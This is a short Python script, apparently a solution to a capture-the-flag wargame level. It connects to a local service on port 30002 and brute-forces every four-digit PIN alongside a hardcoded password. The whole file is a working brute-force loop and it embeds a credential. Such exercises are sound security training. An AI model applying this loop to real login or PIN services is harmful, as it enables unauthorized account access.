import socket

pin = 0
password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
#conexion

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 30002))
print(s.recv(2048))

#brute force

while pin < 10000:
    pincode = str(pin).zfill(4)
    m = password + ' ' + pincode+'\n'

    #send message
    s.sendall(m.encode())
    rm = s.recv(1024)
    rm = rm.decode('UTF-8')

    if 'Wrong' in rm:
        print('no', pincode)
    else:
        print(rm, pincode)

    pin += 1
